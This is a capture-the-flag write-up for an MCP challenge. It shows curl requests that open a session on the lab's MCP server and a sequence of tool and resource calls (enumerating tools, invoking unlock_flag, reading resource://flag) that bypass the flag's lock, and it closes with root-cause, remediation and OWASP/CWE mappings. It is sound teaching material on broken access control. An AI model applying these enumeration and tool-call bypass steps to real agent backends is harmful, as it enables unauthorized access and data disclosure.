# Master of Resources — ARKX Advanced L7

**Master of Resources** is an MCP (Model Context Protocol) challenge. The agent announces that its connection to an MCP server was "severed" and hands over the server address, claiming it can do nothing else. The real target is that MCP server: it is fully reachable and self-describing to any authenticated client, and the flag's "lock" is a trivial, caller-controlled toggle.

> **Flag:** `flag-4ca970` · **Category:** AI Agent / MCP · **Impact:** High (broken access control)

## The server rejects the browser by design

Calling the endpoint straight from the page console fails:

```text
fetch('/level/7/mcp', { method: 'POST', ... })
=> 403  Invalid Origin header
```

The MCP server rejects any request that carries a browser `Origin` header — an anti-DNS-rebinding protection — and browsers force that header on and won't let JavaScript remove it. So the page can't reach it. A non-browser client sends no `Origin` and is accepted.

![Browser-origin requests are refused](writeups/images/mor-origin-error.jpg)

## Speaking MCP directly

MCP streamable-HTTP needs three things in order: `initialize`, then a `notifications/initialized`, then every later call must echo back the `mcp-session-id` header from the initialize response.

```bash
# initialize — capture the session id from the response headers
curl -i -N 'https://ctf.arkx.ninja/level/7/mcp' \
  -H 'Accept: application/json, text/event-stream' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <authenticated session cookies>' \
  -X POST -d '{"jsonrpc":"2.0","id":1,"method":"initialize",
       "params":{"protocolVersion":"2024-11-05","capabilities":{},
                 "clientInfo":{"name":"c","version":"1"}}}'
# => HTTP/2 200   mcp-session-id: <id>   serverInfo: "Weather"
```

Omitting the session header on a later call returns `Bad Request: Missing session ID` — each fresh request otherwise starts a new, empty session.

## Enumerate, then bypass the lock

```text
tools/list      => unlock_flag  ("Unlocks the flag resource, allowing it to be accessed.")
resources/list  => resource://flag , resource://super-secret   (super-secret is a decoy rickroll)
```

Reading the flag resource directly is gated:

```text
resources/read  uri="resource://flag"
=> "flag is locked"
```

But the only thing standing between a caller and the flag is a tool the caller is allowed to invoke:

```text
tools/call  name="unlock_flag"
=> "Flag has been unlocked! You can now access the flag resource."

resources/read  uri="resource://flag"
=> "You did it! the flag is: flag-4ca970"
```

![Mission accomplished — flag acquired](writeups/images/mor-solved.jpg)

> **flag-4ca970**

## Root cause

- **The resource server is fully exposed and self-describing** to any authenticated client. "Main interface is down" is cosmetic, not a control.
- **The flag's authorization is a session-scoped boolean** that the caller flips by invoking `unlock_flag` itself. A privileged capability is published as a freely callable tool with no real access-control check behind it.
- **The only barrier is an `Origin` check** that stops browsers but does nothing against a direct client.
- **`resources/read` and the unlock tool are separate code paths**; nothing ties the resource's gate to a genuine authorization decision about *who* is calling.

## Impact

Any party with a valid session — or stolen session cookies — can enumerate every tool and resource on the MCP server and call privileged tools directly, bypassing the intended UI gating. In a real deployment this is unauthorized tool invocation and sensitive-data disclosure on an agent's backend: broken access control at the tool/resource layer.

## Remediation

- Enforce authorization **inside each tool and resource handler**, keyed to the caller's identity and permissions — never on a client-settable flag.
- Don't expose sensitive resources through an MCP server that any authenticated client can enumerate; separate privileged and public surfaces.
- Keep the `Origin` / DNS-rebinding check, but treat it as one layer, not the boundary.

## Mapping

| Framework | Classification |
|---|---|
| OWASP LLM (2025) | LLM06 Excessive Agency + LLM08 insecure tool / plugin integration |
| MITRE ATLAS | AML.T0053 LLM Plugin Compromise · tool discovery & enumeration |
| CWE | CWE-285 Improper Authorization · CWE-284 Improper Access Control |
